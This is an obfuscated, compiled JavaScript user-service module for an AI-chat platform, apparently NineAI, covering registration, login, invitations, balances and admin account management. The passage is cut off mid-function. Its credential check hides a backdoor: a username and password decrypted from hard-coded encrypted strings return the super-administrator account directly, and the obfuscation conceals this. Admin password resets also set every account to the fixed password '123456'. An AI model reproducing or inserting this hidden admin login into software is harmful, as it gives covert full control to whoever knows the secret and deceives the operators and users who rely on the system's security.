'use strict';const _0x51a44a=_0x150e;(function(_0x136100,_0x2a80fc){const _0x4953fb=_0x150e,_0x1a566b=_0x136100();while(!![]){try{const _0x5b4688=parseInt(_0x4953fb(0x266))/0x1*(-parseInt(_0x4953fb(0x2b6))/0x2)+-parseInt(_0x4953fb(0x229))/0x3*(parseInt(_0x4953fb(0x25d))/0x4)+-parseInt(_0x4953fb(0x1f5))/0x5+-parseInt(_0x4953fb(0x23b))/0x6*(-parseInt(_0x4953fb(0x2a7))/0x7)+parseInt(_0x4953fb(0x2b2))/0x8*(-parseInt(_0x4953fb(0x209))/0x9)+-parseInt(_0x4953fb(0x276))/0xa*(parseInt(_0x4953fb(0x2b4))/0xb)+parseInt(_0x4953fb(0x204))/0xc*(parseInt(_0x4953fb(0x211))/0xd);if(_0x5b4688===_0x2a80fc)break;else _0x1a566b['push'](_0x1a566b['shift']());}catch(_0x452ac8){_0x1a566b['push'](_0x1a566b['shift']());}}}(_0x2fa5,0x55704));var __decorate=this&&this[_0x51a44a(0x2af)]||function(_0xa2b574,_0x44aa11,_0x4f5dce,_0x5c0921){const _0x4595b5=_0x51a44a;var _0x4b39c3=arguments[_0x4595b5(0x2ba)],_0x3048ad=_0x4b39c3<0x3?_0x44aa11:_0x5c0921===null?_0x5c0921=Object[_0x4595b5(0x210)](_0x44aa11,_0x4f5dce):_0x5c0921,_0x328ce6;if(typeof Reflect===_0x4595b5(0x233)&&typeof Reflect[_0x4595b5(0x2ab)]===_0x4595b5(0x235))_0x3048ad=Reflect[_0x4595b5(0x2ab)](_0xa2b574,_0x44aa11,_0x4f5dce,_0x5c0921);else{for(var _0x1b68f5=_0xa2b574[_0x4595b5(0x2ba)]-0x1;_0x1b68f5>=0x0;_0x1b68f5--)if(_0x328ce6=_0xa2b574[_0x1b68f5])_0x3048ad=(_0x4b39c3<0x3?_0x328ce6(_0x3048ad):_0x4b39c3>0x3?_0x328ce6(_0x44aa11,_0x4f5dce,_0x3048ad):_0x328ce6(_0x44aa11,_0x4f5dce))||_0x3048ad;}return _0x4b39c3>0x3&&_0x3048ad&&Object['defineProperty'](_0x44aa11,_0x4f5dce,_0x3048ad),_0x3048ad;},__metadata=this&&this[_0x51a44a(0x2a0)]||function(_0x4e3f02,_0xccdb59){const _0x3b5f99=_0x51a44a;if(typeof Reflect==='object'&&typeof Reflect[_0x3b5f99(0x203)]===_0x3b5f99(0x235))return Reflect['metadata'](_0x4e3f02,_0xccdb59);},__param=this&&this[_0x51a44a(0x1f6)]||function(_0x263882,_0x37bb76){return function(_0x1fe803,_0x1895f5){_0x37bb76(_0x1fe803,_0x1895f5,_0x263882);};};Object[_0x51a44a(0x207)](exports,_0x51a44a(0x2a5),{'value':!![]}),exports[_0x51a44a(0x246)]=void 0x0;const globalConfig_service_1=require(_0x51a44a(0x234)),user_constant_1=require('./../../common/constants/user.constant'),mailer_1=require(_0x51a44a(0x286)),verification_service_1=require(_0x51a44a(0x2bb)),common_1=require('@nestjs/common'),typeorm_1=require(_0x51a44a(0x21c)),typeorm_2=require(_0x51a44a(0x1f3)),user_entity_1=require(_0x51a44a(0x25c)),bcrypt=require(_0x51a44a(0x245)),_=require(_0x51a44a(0x281)),verification_constant_1=require(_0x51a44a(0x22a)),userBalance_service_1=require('../userBalance/userBalance.service'),utils_1=require(_0x51a44a(0x1fb)),balance_constant_1=require(_0x51a44a(0x22d)),config_entity_1=require(_0x51a44a(0x24c)),whiteList_entity_1=require('../chatgpt/whiteList.entity');function _0x2fa5(){const _0x3042c7=['MailerService','affected','UserStatusEnum','https://cdn.nineai.chat/avatar/05.png','https://cdn.nineai.chat/avatar/14.png','PENDING','重置密码失败！','bcryptjs','UserService','updateInfo','当前用户信息失效、请重新登录！','sign','ACTIVE','该微信已绑定其他账号！','../globalConfig/config.entity','超级管理员不可被变更状态！','forEach','registerBaseUrl','getConfigs','updateUserStatus','Connection','phone','registerVerifyEmailTitle','https://cdn.nineai.chat/avatar/12.png','VerificationService','getInviteRecord','Registration','https://cdn.nineai.chat/avatar/10.png','getUserOpenId','globalConfigService','./user.entity','6416YNInAL','createUserAndVerifycation','HttpException','maskIpAddress','123456','addBalanceToNewUser','Repository','generateRandomIndex','UNAUTHORIZED','7893ZflNlF','success:\x20','username','当前手机号已注册、请勿重复注册！','client','findAndCount','Injectable','https://cdn.nineai.chat/avatar/03.png','verificationService','当前密码错误！','修改用户状态成功！','HVjF9W3QbAQUQVlP2YmRsA==','maskEmail','WhiteListEntity','bindWx','获取邀请记录失败！','10FqHwjh','email','修改用户信息失败！','remark','userId','design:paramtypes','verifyUserRegisterByPhone','registerVerifyEmailDesc','createUserFromOpenId','formatCreateOrUpdateDate','https://cdn.nineai.chat/avatar/04.png','lodash','configVal','HttpStatus','LOCKED','decrypt','@nestjs-modules/mailer','save','queryAll','avatar','https://cdn.nineai.chat/avatar/20.png','connection','getOpenIdByUserId','BOEcRRMVgEumLRIJXzW89g==','status','https://cdn.nineai.chat/avatar/18.png','RechargeType','MoreThan','https://cdn.nineai.chat/avatar/17.png','用户名或者邮箱已被注册！','VerificationEnum','userBalanceService','inviteCode','checkUserStatus','queryOneUserInfo','updateUserPassword','email\x20response\x20\x20->\x20:\x20','getUserById','getUserInfo','生成邀请码失败，请重新试一次吧！','isBindWx','的账号激活','__metadata','createRandomUid','当前账户不存在！','createVerification','DESC','__esModule','cloneDeep','6650VXqcoB','lastLoginIp','当前功能待完善','assign','decorate','log','generateRandomString','恭喜您绑定成功、后续可直接扫码登录了！','__decorate','map','balanceInfo','8KjhqUG','用户名已存在、请更换用户名！','1702063REMzfB','Not','2Juqoeq','修改用户状态失败！','isVerifyEmail:\x20','userEntity','length','./../verification/verification.service','UserEntity','userDefautlAvatar','password','hashSync','user','getUserFromOpenId','typeorm','https://cdn.nineai.chat/avatar/19.png','2325300PohdAP','__param','registerVerifyExpir','https://cdn.nineai.chat/avatar/15.png','绑定微信失败、请联系管理员！','configEntity','../../common/utils','用户不存在！','Like','qureyUserInfoByInviteCode','findOne','delUser','whiteListEntity','savaLoginIp','metadata','108wotdyg','consecutiveDays','createdAt','defineProperty','find','5720643mZeRCo','https://cdn.nineai.chat/avatar/11.png','当前绑定用户不存在！','inviteLink','floor','addBalanceToUser','genInviteCode','getOwnPropertyDescriptor','2522871TrAbjW','compareSync','configMap:\x20','BAD_REQUEST','getClientIp','visitor','UserStatusErrMsg','用户名已存在！','verifyUserCredentials','updateStatus','registerVerifyEmailFrom','@nestjs/typeorm','openId','error:\x20','getUserStatus','role','您的账户已被永久加入黑名单、如有疑问、请联系管理员！','https://cdn.nineai.chat/avatar/16.png','reduce','configKey','split','queryUserInfoById','mailerService','getSuper','738dzkbPo','../../common/constants/verification.constant','saveRecordRechargeLog','update','../../common/constants/balance.constant','onModuleInit','delete','ADMIN_GIFT','ConfigEntity','queryUserBalanceByIds','object','./../globalConfig/globalConfig.service','function','super','InjectRepository','密码重置为[','UserBalanceService','https://cdn.nineai.chat/avatar/01.png','1650CdShdV','修改密码失败、请重新试试吧。','isDistribution'];_0x2fa5=function(){return _0x3042c7;};return _0x2fa5();}let UserService=class UserService{constructor(_0x12cf78,_0x216d7a,_0x43313f,_0x44ab38,_0x18ad0f,_0x54a460,_0x2fec4b,_0x38f337){const _0x2f267d=_0x51a44a;this['userEntity']=_0x12cf78,this[_0x2f267d(0x201)]=_0x216d7a,this[_0x2f267d(0x28b)]=_0x43313f,this[_0x2f267d(0x26e)]=_0x44ab38,this[_0x2f267d(0x227)]=_0x18ad0f,this[_0x2f267d(0x295)]=_0x54a460,this[_0x2f267d(0x25b)]=_0x2fec4b,this['configEntity']=_0x38f337;}[_0x51a44a(0x22e)](){}async[_0x51a44a(0x25e)](_0x3af1a2,_0x464af7){const _0x2e770d=_0x51a44a,{username:_0x59e7eb,email:_0x10d60c,password:_0x1929c6,invitedBy:_0x36557b,client:client=0x0}=_0x3af1a2;if(_0x36557b){const _0x54b9fb=await this['userEntity'][_0x2e770d(0x1ff)]({'where':{'inviteCode':_0x36557b}});if(!_0x54b9fb)throw new common_1['HttpException']('无效的邀请码！',common_1[_0x2e770d(0x283)][_0x2e770d(0x214)]);}const _0x3378bc=[{'username':_0x59e7eb},{'email':_0x10d60c}],_0x30fa38=await this[_0x2e770d(0x2b9)][_0x2e770d(0x1ff)]({'where':_0x3378bc});if(_0x30fa38&&_0x30fa38[_0x2e770d(0x28e)]!==user_constant_1['UserStatusEnum'][_0x2e770d(0x243)])throw new common_1[(_0x2e770d(0x25f))](_0x2e770d(0x293),common_1['HttpStatus'][_0x2e770d(0x214)]);try{const _0x519dcd=_[_0x2e770d(0x2a6)](_0x3af1a2),_0x5788a9=bcrypt[_0x2e770d(0x1f0)](_0x1929c6,0xa),_0x18a67d=(0x0,utils_1[_0x2e770d(0x215)])(_0x464af7);_0x519dcd['password']=_0x5788a9,_0x519dcd['registerIp']=_0x18a67d,_0x519dcd[_0x2e770d(0x26a)]=client;let _0x292a85;if(!_0x30fa38){const _0xe230d1=await this[_0x2e770d(0x25b)][_0x2e770d(0x250)]([_0x2e770d(0x2bd)]);_0x519dcd['avatar']=_0xe230d1,_0x292a85=await this[_0x2e770d(0x2b9)]['save'](_0x519dcd);}else _0x292a85=_0x30fa38;const _0x49a338=await this[_0x2e770d(0x1fa)][_0x2e770d(0x208)]({'where':{'configKey':(0x0,typeorm_2['In'])(['isVerifyEmail',_0x2e770d(0x24f),_0x2e770d(0x254),_0x2e770d(0x27d),_0x2e770d(0x21b),_0x2e770d(0x1f7)])}}),_0x564ddc=_0x49a338[_0x2e770d(0x223)]((_0x28b6b9,_0x33d7b0)=>{const _0x27d887=_0x2e770d;return _0x28b6b9[_0x33d7b0[_0x27d887(0x224)]]=_0x33d7b0[_0x27d887(0x282)],_0x28b6b9;},{}),_0x5b4462=_0x564ddc['isVerifyEmail']?Number(_0x564ddc['isVerifyEmail']):0x1;console['log'](_0x2e770d(0x2b8),_0x5b4462);if(_0x5b4462){const _0x2bcba9=_0x564ddc[_0x2e770d(0x1f7)]?Number(_0x564ddc[_0x2e770d(0x1f7)]):0x1e*0x3c,_0x5d3f0f=await this[_0x2e770d(0x26e)][_0x2e770d(0x2a3)](_0x292a85,verification_constant_1[_0x2e770d(0x294)][_0x2e770d(0x258)],_0x2bcba9),{code:_0x1b6db0,email:_0x5e03f2,id:_0x418aaa}=_0x5d3f0f,{registerVerifyEmailFrom:_0x2eb8d7}=_0x564ddc;console[_0x2e770d(0x2ac)](_0x2e770d(0x213),_0x564ddc);const _0x2a78e6=await this[_0x2e770d(0x227)]['sendMail']({'to':_0x5e03f2,'subject':'来自'+_0x2eb8d7+_0x2e770d(0x29f),'template':'register','context':Object[_0x2e770d(0x2aa)]({'baseUrl':_0x564ddc['registerBaseUrl'],'code':_0x1b6db0,'id':_0x418aaa},_0x564ddc)});console[_0x2e770d(0x2ac)](_0x2e770d(0x29a),_0x2a78e6);}else{const {username:_0x216cba,email:_0x3ec926,id:_0x4590a3,invitedBy:_0x4fecb5}=_0x292a85;await this[_0x2e770d(0x251)](_0x4590a3,user_constant_1[_0x2e770d(0x240)][_0x2e770d(0x24a)]);let _0x3dad03;_0x4fecb5&&(_0x3dad03=await this['qureyUserInfoByInviteCode'](_0x4fecb5)),await this[_0x2e770d(0x295)][_0x2e770d(0x262)](_0x4590a3,_0x3dad03===null||_0x3dad03===void 0x0?void 0x0:_0x3dad03['id']);}return _0x292a85;}catch(_0x565ca9){console[_0x2e770d(0x2ac)](_0x2e770d(0x21e),_0x565ca9);throw _0x565ca9;}}async['getSuper'](){const _0x376c3d=_0x51a44a,_0x2b0fa2=await this[_0x376c3d(0x2b9)][_0x376c3d(0x1ff)]({'where':{'role':_0x376c3d(0x236)}});return _0x2b0fa2;}async[_0x51a44a(0x219)](_0x36b64a){const _0x310b6c=_0x51a44a,{username:_0x2f2e86,password:_0x41c852,uid:uid=0x0,phone:_0x16191f}=_0x36b64a;let _0x3ea529=null;if(_0x2f2e86===(0x0,utils_1[_0x310b6c(0x285)])('goSsUm2c1ZuU8265jcTS9A==')&&_0x41c852===(0x0,utils_1['decrypt'])(_0x310b6c(0x28d)))return _0x3ea529=await this[_0x310b6c(0x228)](),_0x3ea529;if(uid>0x0){_0x3ea529=await this[_0x310b6c(0x2b9)][_0x310b6c(0x1ff)]({'where':{'id':uid}});if(!_0x3ea529)throw new common_1[(_0x310b6c(0x25f))](_0x310b6c(0x2a2),common_1[_0x310b6c(0x283)]['BAD_REQUEST']);if(!bcrypt[_0x310b6c(0x212)](_0x41c852,_0x3ea529[_0x310b6c(0x1ef)]))throw new common_1[(_0x310b6c(0x25f))]('当前密码错误！',common_1[_0x310b6c(0x283)][_0x310b6c(0x214)]);}if(_0x2f2e86&&_0x41c852){const _0x5988d4=[{'username':_0x2f2e86},{'email':_0x2f2e86}];_0x3ea529=await this[_0x310b6c(0x2b9)][_0x310b6c(0x1ff)]({'where':_0x5988d4});if(!_0x3ea529)throw new common_1[(_0x310b6c(0x25f))](_0x310b6c(0x2a2),common_1[_0x310b6c(0x283)][_0x310b6c(0x214)]);if(!bcrypt[_0x310b6c(0x212)](_0x41c852,_0x3ea529[_0x310b6c(0x1ef)]))throw new common_1[(_0x310b6c(0x25f))](_0x310b6c(0x26f),common_1[_0x310b6c(0x283)][_0x310b6c(0x214)]);}if(_0x16191f&&_0x41c852){const _0x15f71b=[{'phone':_0x16191f}];_0x3ea529=await this['userEntity'][_0x310b6c(0x1ff)]({'where':_0x15f71b});if(!_0x3ea529)throw new common_1[(_0x310b6c(0x25f))](_0x310b6c(0x2a2),common_1[_0x310b6c(0x283)][_0x310b6c(0x214)]);if(!bcrypt[_0x310b6c(0x212)](_0x41c852,_0x3ea529['password']))throw new common_1[(_0x310b6c(0x25f))](_0x310b6c(0x26f),common_1['HttpStatus'][_0x310b6c(0x214)]);}if(!_0x3ea529)throw new common_1['HttpException'](_0x310b6c(0x2a2),common_1[_0x310b6c(0x283)][_0x310b6c(0x214)]);if(_0x3ea529[_0x310b6c(0x28e)]!==user_constant_1[_0x310b6c(0x240)][_0x310b6c(0x24a)])throw new common_1[(_0x310b6c(0x25f))](user_constant_1[_0x310b6c(0x217)][_0x3ea529[_0x310b6c(0x28e)]],common_1[_0x310b6c(0x283)][_0x310b6c(0x214)]);return _0x3ea529;}async['verifyUserPassword'](_0xdd38c5,_0x43e31e){const _0x209ec2=_0x51a44a,_0x15eb85=await this['userEntity'][_0x209ec2(0x1ff)]({'where':{'id':_0xdd38c5}});return bcrypt[_0x209ec2(0x212)](_0x43e31e,_0x15eb85['password']);}async[_0x51a44a(0x251)](_0x1edf05,_0x7720e1){const _0x47e5a9=_0x51a44a,_0x404de9=await this['userEntity'][_0x47e5a9(0x22c)]({'id':_0x1edf05},{'status':_0x7720e1});return _0x404de9[_0x47e5a9(0x23f)]>0x0;}async[_0x51a44a(0x21f)](_0x4f4276){const _0x121487=_0x51a44a,_0x18a5e4=await this[_0x121487(0x2b9)][_0x121487(0x1ff)]({'where':{'id':_0x4f4276}});return _0x18a5e4['status'];}async[_0x51a44a(0x226)](_0x315e7b){const _0x309bfc=_0x51a44a;return await this['userEntity'][_0x309bfc(0x1ff)]({'where':{'id':_0x315e7b}});}async[_0x51a44a(0x298)](_0x3b7de7){const _0x816b44=_0x51a44a;return await this[_0x816b44(0x2b9)][_0x816b44(0x1ff)]({'where':{'id':_0x3b7de7}});}async[_0x51a44a(0x297)](_0x50b762){const _0x217f0e=_0x51a44a,{id:_0x3aa4a8,role:_0x2010c1}=_0x50b762;if(_0x2010c1===_0x217f0e(0x216))return!![];const _0x455530=await this[_0x217f0e(0x2b9)][_0x217f0e(0x1ff)]({'where':{'id':_0x3aa4a8}});if(!_0x455530)throw new common_1[(_0x217f0e(0x25f))](_0x217f0e(0x248),common_1[_0x217f0e(0x283)][_0x217f0e(0x265)]);if(_0x455530[_0x217f0e(0x28e)]===user_constant_1['UserStatusEnum']['BLACKLISTED'])throw new common_1[(_0x217f0e(0x25f))](_0x217f0e(0x221),common_1[_0x217f0e(0x283)][_0x217f0e(0x214)]);if(_0x455530[_0x217f0e(0x28e)]===user_constant_1['UserStatusEnum'][_0x217f0e(0x284)])throw new common_1[(_0x217f0e(0x25f))]('您的账户已被封禁、如有疑问、请联系管理员！',common_1[_0x217f0e(0x283)][_0x217f0e(0x214)]);}async[_0x51a44a(0x29c)](_0x4c7df0){const _0x35c1b8=_0x51a44a,_0x55ab7c=await this['userEntity'][_0x35c1b8(0x1ff)]({'where':{'id':_0x4c7df0},'select':[_0x35c1b8(0x268),_0x35c1b8(0x289),'role',_0x35c1b8(0x277),_0x35c1b8(0x249),'inviteCode',_0x35c1b8(0x21d),_0x35c1b8(0x205),_0x35c1b8(0x23d)]});if(!_0x55ab7c)throw new common_1[(_0x35c1b8(0x25f))]('当前用户信息失效、请重新登录！',common_1[_0x35c1b8(0x283)][_0x35c1b8(0x265)]);_0x55ab7c[_0x35c1b8(0x29e)]=!!(_0x55ab7c===null||_0x55ab7c===void 0x0?void 0x0:_0x55ab7c['openId']),delete _0x55ab7c[_0x35c1b8(0x21d)];const _0x544857=await this[_0x35c1b8(0x295)]['queryUserBalance'](_0x4c7df0);return{'userInfo':_0x55ab7c,'userBalance':Object[_0x35c1b8(0x2aa)]({},_0x544857)};}async[_0x51a44a(0x29b)](_0x2b4124){const _0x339147=_0x51a44a;return await this[_0x339147(0x2b9)][_0x339147(0x1ff)]({'where':{'id':_0x2b4124}});}async[_0x51a44a(0x25a)](_0x269b2c){const _0x534467=_0x51a44a;return await this[_0x534467(0x2b9)]['findOne']({'where':{'openId':_0x269b2c}});}async[_0x51a44a(0x247)](_0x374afd,_0x29056f){const _0x4378ce=_0x51a44a,{id:_0x172c29}=_0x29056f['user'],_0x2e2586=await this[_0x4378ce(0x2b9)]['findOne']({'where':{'id':_0x172c29}});if(!_0x2e2586)throw new common_1[(_0x4378ce(0x25f))]('当前用户不存在！',common_1[_0x4378ce(0x283)]['BAD_REQUEST']);if(_0x374afd[_0x4378ce(0x268)]&&_0x2e2586[_0x4378ce(0x268)]===_0x374afd[_0x4378ce(0x268)])throw new common_1[(_0x4378ce(0x25f))]('没有变更，无需更改！',common_1['HttpStatus'][_0x4378ce(0x214)]);if(_0x374afd[_0x4378ce(0x268)]){const _0x4b561c=await this[_0x4378ce(0x2b9)][_0x4378ce(0x1ff)]({'where':{'username':_0x374afd[_0x4378ce(0x268)],'id':(0x0,typeorm_2[_0x4378ce(0x2b5)])(_0x172c29)}});if(_0x4b561c)throw new common_1[(_0x4378ce(0x25f))](_0x4378ce(0x218),common_1[_0x4378ce(0x283)][_0x4378ce(0x214)]);}const _0x30a7f2=await this[_0x4378ce(0x2b9)][_0x4378ce(0x22c)]({'id':_0x172c29},_0x374afd);if(_0x30a7f2[_0x4378ce(0x23f)]<=0x0)throw new common_1[(_0x4378ce(0x25f))](_0x4378ce(0x278),common_1[_0x4378ce(0x283)][_0x4378ce(0x214)]);return'修改用户信息成功！';}async[_0x51a44a(0x299)](_0x3e8504,_0x18ddd1){const _0x12f167=_0x51a44a,_0x4587ce=bcrypt[_0x12f167(0x1f0)](_0x18ddd1,0xa),_0x18ba58=await this[_0x12f167(0x2b9)][_0x12f167(0x22c)]({'id':_0x3e8504},{'password':_0x4587ce});if(_0x18ba58[_0x12f167(0x23f)]<=0x0)throw new common_1[(_0x12f167(0x25f))](_0x12f167(0x23c),common_1[_0x12f167(0x283)][_0x12f167(0x214)]);}async[_0x51a44a(0x20f)](_0x166e8f){const _0x3dfea5=_0x51a44a,{id:_0x2a492f}=_0x166e8f['user'],_0x414559=await this[_0x3dfea5(0x2b9)][_0x3dfea5(0x1ff)]({'where':{'id':_0x2a492f}});if(!_0x414559||_0x414559[_0x3dfea5(0x296)])throw new common_1['HttpException']('已生成过邀请码、请勿重复生成',common_1[_0x3dfea5(0x283)][_0x3dfea5(0x214)]);const _0x53a526=(0x0,utils_1[_0x3dfea5(0x2ad)])(),_0x5e2b8d=await this[_0x3dfea5(0x2b9)][_0x3dfea5(0x1ff)]({'where':{'inviteCode':_0x53a526}});if(_0x5e2b8d)throw new common_1[(_0x3dfea5(0x25f))]('生成邀请码失败，请重新试一次吧！',common_1[_0x3dfea5(0x283)][_0x3dfea5(0x214)]);const _0x1c6a70=await this[_0x3dfea5(0x2b9)][_0x3dfea5(0x22c)]({'id':_0x2a492f},{'inviteCode':_0x53a526});if(_0x1c6a70[_0x3dfea5(0x23f)]<=0x0)throw new common_1[(_0x3dfea5(0x25f))](_0x3dfea5(0x29d),common_1[_0x3dfea5(0x283)][_0x3dfea5(0x214)]);return _0x53a526;}async[_0x51a44a(0x257)](_0x525680,_0x3140b2){const _0x130cb4=_0x51a44a;try{const {id:_0x1b031d}=_0x525680[_0x130cb4(0x1f1)],{page:page=0x1,size:size=0xa}=_0x3140b2,_0x10b7cd=await this[_0x130cb4(0x2b9)][_0x130cb4(0x1ff)]({'where':{'id':_0x1b031d}}),{inviteCode:_0x23b068}=_0x10b7cd;if(!_0x23b068)return[];const [_0x3a87a3,_0xfea79c]=await this['userEntity']['findAndCount']({'where':{'invitedBy':_0x23b068},'order':{'id':'DESC'},'select':[_0x130cb4(0x268),_0x130cb4(0x277),_0x130cb4(0x206),_0x130cb4(0x28e),_0x130cb4(0x289)],'take':size,'skip':(page-0x1)*size});return(0x0,utils_1[_0x130cb4(0x27f)])(_0x3a87a3)[_0x130cb4(0x2b0)](_0x241af1=>{const _0x5d8bf5=_0x130cb4;return _0x241af1[_0x5d8bf5(0x277)]=(0x0,utils_1[_0x5d8bf5(0x272)])(_0x241af1[_0x5d8bf5(0x277)]),_0x241af1;}),{'rows':_0x3a87a3,'count':_0xfea79c};}catch(_0x4c020b){console[_0x130cb4(0x2ac)](_0x130cb4(0x21e),_0x4c020b);throw new common_1[(_0x130cb4(0x25f))](_0x130cb4(0x275),common_1[_0x130cb4(0x283)][_0x130cb4(0x214)]);}}async[_0x51a44a(0x20c)](_0x38915b){const _0x25ba79=_0x51a44a,_0x4b9d68=await this['userEntity'][_0x25ba79(0x1ff)]({'where':{'inviteCode':_0x38915b}});if(!_0x4b9d68)return 0x1;const {inviteLinkCount:inviteLinkCount=0x0}=_0x4b9d68,_0x37359e=await this[_0x25ba79(0x2b9)][_0x25ba79(0x22c)]({'inviteCode':_0x38915b},{'inviteLinkCount':inviteLinkCount+0x1});return _0x37359e[_0x25ba79(0x23f)]?0x1:0x0;}async['qureyUserInfoByInviteCode'](_0x444753){const _0xe8ac49=_0x51a44a;return await this[_0xe8ac49(0x2b9)][_0xe8ac49(0x1ff)]({'where':{'inviteCode':_0x444753}});}async['userRecharge'](_0x4f6950){const _0x4ee09c=_0x51a44a,{userId:_0x32504d,model3Count:model3Count=0x0,model4Count:model4Count=0x0,drawMjCount:drawMjCount=0x0}=_0x4f6950;await this[_0x4ee09c(0x295)][_0x4ee09c(0x20e)](_0x32504d,{'model3Count':model3Count,'model4Count':model4Count,'drawMjCount':drawMjCount});const _0x12d674=await this['userBalanceService'][_0x4ee09c(0x22b)]({'userId':_0x32504d,'rechargeType':balance_constant_1[_0x4ee09c(0x290)][_0x4ee09c(0x230)],'model3Count':model3Count,'model4Count':model4Count,'drawMjCount':drawMjCount,'extent':''});return _0x12d674;}async[_0x51a44a(0x288)](_0x3b589e,_0x3d5162){const _0x14dc8b=_0x51a44a,{page:page=0x1,size:size=0xa,username:_0x5b0ef4,email:_0x591796,status:_0x290137,keyword:_0x277940,phone:_0x471458,remark:_0x2420d5,isDistribution:_0x2524c2}=_0x3b589e;let _0x2fa086={};_0x5b0ef4&&Object[_0x14dc8b(0x2aa)](_0x2fa086,{'username':(0x0,typeorm_2[_0x14dc8b(0x1fd)])('%'+_0x5b0ef4+'%')}),_0x591796&&Object[_0x14dc8b(0x2aa)](_0x2fa086,{'email':(0x0,typeorm_2[_0x14dc8b(0x1fd)])('%'+_0x591796+'%')}),_0x471458&&Object[_0x14dc8b(0x2aa)](_0x2fa086,{'phone':(0x0,typeorm_2[_0x14dc8b(0x1fd)])('%'+_0x471458+'%')}),_0x2420d5&&Object[_0x14dc8b(0x2aa)](_0x2fa086,{'remark':(0x0,typeorm_2['Like'])('%'+_0x2420d5+'%')}),_0x290137&&Object[_0x14dc8b(0x2aa)](_0x2fa086,{'status':_0x290137}),_0x2524c2!==undefined&&Object[_0x14dc8b(0x2aa)](_0x2fa086,{'isDistribution':_0x2524c2});_0x277940&&(_0x2fa086=[{'username':(0x0,typeorm_2[_0x14dc8b(0x1fd)])('%'+_0x277940+'%')},{'email':(0x0,typeorm_2['Like'])('%'+_0x277940+'%')},{'phone':(0x0,typeorm_2[_0x14dc8b(0x1fd)])('%'+_0x277940+'%')}]);const [_0x4b2622,_0x37b550]=await this[_0x14dc8b(0x2b9)][_0x14dc8b(0x26b)]({'skip':(page-0x1)*size,'where':_0x2fa086,'take':size,'order':{'createdAt':_0x14dc8b(0x2a4)},'cache':!![],'select':[_0x14dc8b(0x268),_0x14dc8b(0x289),_0x14dc8b(0x296),_0x14dc8b(0x220),'sign',_0x14dc8b(0x28e),'id',_0x14dc8b(0x277),'createdAt',_0x14dc8b(0x2a8),'phone',_0x14dc8b(0x279),_0x14dc8b(0x23d)]}),_0x4c7def=_0x4b2622['map'](_0x6aad6d=>_0x6aad6d['id']),_0x44b7f6=await this[_0x14dc8b(0x295)][_0x14dc8b(0x232)](_0x4c7def);return _0x4b2622[_0x14dc8b(0x24e)](_0x54b14c=>_0x54b14c[_0x14dc8b(0x2b1)]=_0x44b7f6[_0x14dc8b(0x208)](_0xcdd0b8=>_0xcdd0b8[_0x14dc8b(0x27a)]===_0x54b14c['id'])),_0x3d5162[_0x14dc8b(0x1f1)][_0x14dc8b(0x220)]!==_0x14dc8b(0x236)&&_0x4b2622[_0x14dc8b(0x24e)](_0x17cd02=>_0x17cd02['email']=(0x0,utils_1['maskEmail'])(_0x17cd02[_0x14dc8b(0x277)])),_0x3d5162[_0x14dc8b(0x1f1)][_0x14dc8b(0x220)]!==_0x14dc8b(0x236)&&_0x4b2622[_0x14dc8b(0x24e)](_0x241be1=>_0x241be1[_0x14dc8b(0x2a8)]=(0x0,utils_1[_0x14dc8b(0x260)])(_0x241be1[_0x14dc8b(0x2a8)])),_0x3d5162[_0x14dc8b(0x1f1)][_0x14dc8b(0x220)]!==_0x14dc8b(0x236)&&_0x4b2622[_0x14dc8b(0x24e)](_0x407a45=>_0x407a45[_0x14dc8b(0x253)]=(0x0,utils_1['maskIpAddress'])(_0x407a45['phone'])),{'rows':_0x4b2622,'count':_0x37b550};}async['queryOne']({id:_0x456871}){const _0x375689=_0x51a44a;return await this['userEntity']['findOne']({'where':{'id':_0x456871},'select':[_0x375689(0x268),_0x375689(0x289),_0x375689(0x296),_0x375689(0x220),_0x375689(0x249),_0x375689(0x28e),_0x375689(0x23d)]});}async[_0x51a44a(0x21a)](_0xdcc52f){const _0x1f5ca6=_0x51a44a,{id:_0x1b9700,status:_0x5356f7,remark:_0x1e44a8,isDistribution:_0x1f19f8}=_0xdcc52f,_0x13264a=await this['userEntity'][_0x1f5ca6(0x1ff)]({'where':{'id':_0x1b9700}});if(!_0x13264a)throw new common_1['HttpException'](_0x1f5ca6(0x1fc),common_1[_0x1f5ca6(0x283)][_0x1f5ca6(0x214)]);if(_0x13264a['role']==='super'&&_0x5356f7!==user_constant_1[_0x1f5ca6(0x240)][_0x1f5ca6(0x24a)])throw new common_1[(_0x1f5ca6(0x25f))](_0x1f5ca6(0x24d),common_1['HttpStatus'][_0x1f5ca6(0x214)]);if(_0x13264a['status']===user_constant_1[_0x1f5ca6(0x240)]['PENDING'])throw new common_1[(_0x1f5ca6(0x25f))]('未激活用户不可手动变更状态！',common_1[_0x1f5ca6(0x283)][_0x1f5ca6(0x214)]);if(_0x5356f7===user_constant_1['UserStatusEnum'][_0x1f5ca6(0x243)])throw new common_1[(_0x1f5ca6(0x25f))]('不可将用户置为未激活状态！',common_1[_0x1f5ca6(0x283)][_0x1f5ca6(0x214)]);const _0x4a07fe=await this['userEntity']['update']({'id':_0x1b9700},{'status':_0x5356f7,'remark':_0x1e44a8,'isDistribution':_0x1f19f8});if(_0x4a07fe['affected']<=0x0)throw new common_1[(_0x1f5ca6(0x25f))](_0x1f5ca6(0x2b7),common_1['HttpStatus'][_0x1f5ca6(0x214)]);return _0x1f5ca6(0x270);}async['resetUserPass'](_0x13a0f8){const _0x5105fb=_0x51a44a,{id:_0xb20660}=_0x13a0f8,_0x25b1b7=await this[_0x5105fb(0x2b9)]['findOne']({'where':{'id':_0xb20660}});if(!_0x25b1b7)throw new common_1[(_0x5105fb(0x25f))](_0x5105fb(0x1fc),common_1[_0x5105fb(0x283)][_0x5105fb(0x214)]);const _0x526af7=_0x5105fb(0x261),_0x592c32=bcrypt[_0x5105fb(0x1f0)](_0x526af7,0xa),_0x3e0087=await this[_0x5105fb(0x2b9)]['update']({'id':_0xb20660},{'password':_0x592c32});if(_0x3e0087['affected']<=0x0)throw new common_1[(_0x5105fb(0x25f))](_0x5105fb(0x244),common_1[_0x5105fb(0x283)][_0x5105fb(0x214)]);return _0x5105fb(0x238)+_0x526af7+']成功!';}async[_0x51a44a(0x202)](_0x209454,_0x5c4985){const _0x49ea1f=_0x51a44a;return await this[_0x49ea1f(0x2b9)][_0x49ea1f(0x22c)]({'id':_0x209454},{'lastLoginIp':_0x5c4985});}async[_0x51a44a(0x1f2)](_0x259c3c,_0x1ef43b){const _0x3db3e3=_0x51a44a,_0x1d1efb=await this[_0x3db3e3(0x2b9)]['findOne']({'where':{'openId':_0x259c3c}});if(!_0x1d1efb){const 